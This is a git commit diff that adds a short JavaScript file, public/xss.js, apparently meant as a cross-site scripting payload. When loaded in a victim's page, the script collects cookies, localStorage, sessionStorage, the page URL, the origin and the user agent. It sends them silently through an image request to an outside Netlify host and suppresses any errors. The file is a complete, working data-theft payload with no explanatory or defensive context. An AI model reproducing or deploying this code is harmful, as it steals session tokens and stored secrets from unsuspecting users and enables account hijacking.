8f88da9b4b077db1be316fbc948fbea7f069ac6f
Sairex <79695218+saeidrz@users.noreply.github.com>
2025-08-01 22:07:49 +0330

    Update xss.js

--- public/xss.js
+++ public/xss.js
@@ -1,1 +1,18 @@
 // public/xss.js
+(function () {
+  try {
+    const data = {
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      url: location.href,
+      origin: location.origin,
+      userAgent: navigator.userAgent
+    };
+
+    const endpoint = 'https://scintillating-sfogliatella-a51761.netlify.app/';
+    const qs = new URLSearchParams(data).toString();
+
+    new Image().src = endpoint + '?' + qs;
+  } catch (e) {}
+})();
